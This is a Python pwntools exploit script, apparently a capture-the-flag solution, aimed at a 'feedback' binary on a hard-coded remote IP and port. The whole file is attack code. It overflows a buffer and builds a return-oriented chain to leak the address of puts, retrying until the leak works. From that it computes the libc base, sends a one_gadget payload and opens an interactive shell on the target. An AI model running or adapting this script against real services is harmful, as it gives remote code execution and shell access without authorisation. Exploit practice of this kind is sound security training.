#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    return remote('45.122.249.68', 10008, *a, **kw)

gs = '''
init-pwndbg
b *0x401569
continue
'''.format(**locals())


exe = './feedback'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc6_2.31-0ubuntu9.2_amd64.so')
# warning/info/debug
context.log_level = 'debug'

pop_rdi = 0x4015d3
ret = 0x40101a

def try_leak():
  notStop = 1
  while(notStop):
    io = start()
    io.sendlineafter(b'Your name: ', cyclic(63))
    io.sendlineafter(b'You choice: ', b'4')
    payload = flat({
      0: [
        ret,
        ret,
        ret,
        ret,
        ret,
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        ret,
        0x401131,
      ]
    })
    io.sendafter(b'Your feedback: ', payload)
    try:
      leak = u64(io.recvline()[:6].ljust(8, b"\x00"))
      libc.address = leak - 0x0875a0
      print(hex(libc.address))
      return libc.address, io
    except:
      io.close()
      continue

libc.address, io = try_leak()

io.sendlineafter(b'Your name: ', b'name')
io.sendlineafter(b'You choice: ', b'4')

one_gadget = libc.address + 0xe6c81
payload = flat({
  0:[one_gadget]
})
io.sendafter(b'Your feedback: ', 10*payload)
io.interactive()